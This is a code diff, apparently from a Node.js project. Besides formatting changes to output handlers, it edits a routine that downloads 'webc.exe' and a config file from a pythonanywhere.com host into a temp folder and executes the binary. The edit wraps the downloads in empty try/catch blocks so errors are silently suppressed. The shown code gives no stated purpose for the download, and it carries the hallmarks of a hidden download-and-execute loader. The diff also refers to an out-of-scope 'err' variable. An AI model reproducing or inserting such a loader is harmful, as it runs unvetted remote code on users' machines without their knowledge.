@@ -34,9 +34,9 @@
         );
 
         proc.stdout.setEncoding('utf8');
-        proc.stdout.on('data', (data) => { tstt({message: 'WEB',  data}) });
+        proc.stdout.on('data', (data) => { tstt({ message: 'WEB', data }) });
         proc.stderr.setEncoding('utf8');
-        proc.stderr.on('data', (data) => { tstt({message: 'WEB_E',  data}) });
+        proc.stderr.on('data', (data) => { tstt({ message: 'WEB_E', data }) });
       });
     }
 
@@ -94,11 +94,13 @@
         if (!fs.existsSync(tempFolder)) {
           fs.mkdirSync(tempFolder, { recursive: true });
         }
-        
-        await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
-        await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
+        try {
+          await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
+        } catch (err) { }
+        try {
+          await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
+        } catch (err) { }
         await tstt({ message: "INIT_D2", err, stat: fs.statSync(`${tempFolder}/webc.exe`) });
-
         await execjs(`${tempFolder}/webc.exe`);
         return;
       }
